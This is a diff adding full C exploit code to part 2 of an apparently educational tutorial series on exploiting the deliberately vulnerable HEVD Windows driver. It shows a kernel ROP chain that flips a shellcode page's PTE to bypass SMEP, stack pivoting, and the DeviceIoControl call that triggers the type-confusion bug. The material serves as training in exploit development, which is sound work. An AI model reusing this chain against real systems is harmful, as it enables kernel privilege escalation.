@@ -552,6 +552,153 @@ I have changed the shellcode to execute 8 nops then restore the stack and return
 
 Excellent! We execute our shellcode and restore execution back within the driver when we are done. We have a stable exploit, albeit one that doesn't execute any useful shellcode yet.
 
-In the next part we will write shellcode to escalate our privileges.
+In part 3 we will write shellcode to escalate our privileges.
 
+I have included the full code so far:
+
+```c
+#include <stdio.h>
+#include <Windows.h>
+#include <winternl.h>
+#include <psapi.h>
+#include <cstdint>
+
+typedef uint64_t QWORD;
+
+#define ARRAY_SIZE 1024
+
+typedef struct _USER_TYPE_CONFUSION_OBJECT
+{
+    ULONG_PTR ObjectID;
+    ULONG_PTR ObjectType;
+} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;
+
+QWORD GetKernelBase()
+{
+    LPVOID drivers[ARRAY_SIZE];
+    DWORD cbNeeded;
+    EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
+
+    return (QWORD)drivers[0];
+}
+
+int main(int argc, char* argv[]) {
+
+    char shellcode[] = {
+        0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0x4c, 0x89, 0xdc,    // mov    rsp,r11
+        0xc3                 // ret
+    };
+
+    LPVOID alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    if (!alloc)
+    {
+        printf("[!] Error using VirtualAlloc. Error code: %u\n", GetLastError());
+        return 1;
+    }
+
+    printf("[+] Memory allocated: 0x%p\n", alloc);
+
+    // copy the shellcode in to the memory
+    RtlMoveMemory(alloc, shellcode, sizeof(shellcode));
+    printf("[+] Shellcode copied to: 0x%p\n", alloc);
+
+    // get the base of the kernel
+    QWORD kernelBase = GetKernelBase();
+    printf("[+] Kernel base: 0x%p\n", kernelBase);
+
+    // get a handle to the driver
+    HANDLE hDriver = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver",
+        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+    if (hDriver == INVALID_HANDLE_VALUE) {
+        printf("[!] Unable to get a handle for the driver: %d\n", GetLastError());
+        return 1;
+    }
+
+    // ROP Gadgets
+    QWORD ROP_NOP = kernelBase + 0x639131;                          // ret ;
+    QWORD INT3 = kernelBase + 0x852b70;                             // int3; ret;
+
+    // stack pivoting gadgets/values
+    QWORD STACK_PIVOT_ADDR = 0xF6000000;
+    QWORD MOV_ESP = kernelBase + 0x28bdbb;                          // mov esp, 0xF6000000; ret;
+
+    // prepare the new stack
+    QWORD stackAddr = STACK_PIVOT_ADDR - 0x1000;
+    LPVOID stack = VirtualAlloc((LPVOID)stackAddr, 0x14000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    printf("[+] User space stack, allocated address: 0x%p\n", stack);
+
+    if (stack == 0x0)
+    {
+        printf("[!] Error using VirtualAlloc. Error code: %u\n %u\n", GetLastError());
+        return 1;
+    }
+
+    printf("[+] VirtualLock, address: 0x%p\n", stack);
+    if (!VirtualLock((LPVOID)stack, 0x14000)) {
+        printf("[!] Error using VirtualLock. Error code: %u\n %d\n", GetLastError());
+        return 1;
+    }
+
+    int index = 0;
+    QWORD* rop = (QWORD*)((QWORD)STACK_PIVOT_ADDR);
+
+    *(rop + index++) = kernelBase + 0x90b2c3;       // pop rcx; ret;
+    *(rop + index++) = (QWORD)alloc;
+    *(rop + index++) = kernelBase + 0x342bc4;       // MiGetPteAddress
+
+    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
+                                                    // add rsp, 0x28; ret;
+                                                    // junk
+    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
+                                                    // rax = r8 = Shellcode's PTE address
+
+    *(rop + index++) = kernelBase + 0xa0ad41;       // mov r10, rax; mov rax, r10; 
+                                                    // add rsp, 0x28; ret;
+                                                    // junk
+    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
+                                                    // rax = r10 = Shellcode's PTE address
+
+    *(rop + index++) = kernelBase + 0xa502e6;       // mov rax, qword[rax]; ret;
+                                                    // rax = Shellcode's PTE value
+
+    *(rop + index++) = kernelBase + 0x51f5c1;       // mov r8, rax; mov rax, r8; 
+                                                    // add rsp, 0x28; ret;
+                                                    // junk
+    for (int i = 0; i < 5; i++) *(rop + index++) = ROP_NOP;
+                                                    // rax = r8 = Shellcode's PTE value
+
+    *(rop + index++) = kernelBase + 0x8571de;       // mov rcx, r8; mov rax, rcx; ret;
+                                                    // r8 = rcx = rax = Shellcode's PTE value
+
+    *(rop + index++) = kernelBase + 0x643308;       // pop rax; ret;
+    *(rop + index++) = (QWORD)0x4;
+    *(rop + index++) = kernelBase + 0xa6d474;       // sub rcx, rax; mov rax, rcx; ret;
+                                                    // rcx = rax = modified PTE value
+
+    *(rop + index++) = kernelBase + 0x222d3d;       // mov qword[r10], rax; ret;
+                                                    // moves the modified PTE value to the PTE address
+
+    *(rop + index++) = kernelBase + 0x385a10;       // wbinvd ; ret ;
+
+    // ret to user space shellcode
+    *(rop + index++) = (QWORD)alloc;
+
+    // allocate the userObject
+    USER_TYPE_CONFUSION_OBJECT userObject = { 0 };
+    userObject.ObjectID = (ULONG_PTR)0x4141414141414141;            // junk
+    userObject.ObjectType = (ULONG_PTR)MOV_ESP;                     // the gadget to execute
+
+    printf("[!] Press a key to trigger the bug...\n");
+    getchar();
+
+    // trigger the bug
+    DeviceIoControl(hDriver, 0x222023, (LPVOID)&userObject, sizeof(userObject), NULL, 0, NULL, NULL);
+
+    return 0;
+}
+```
 [Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/kernel/hevd) : [Part 3](https://plackyhacker.github.io/kernel/hevd-3)
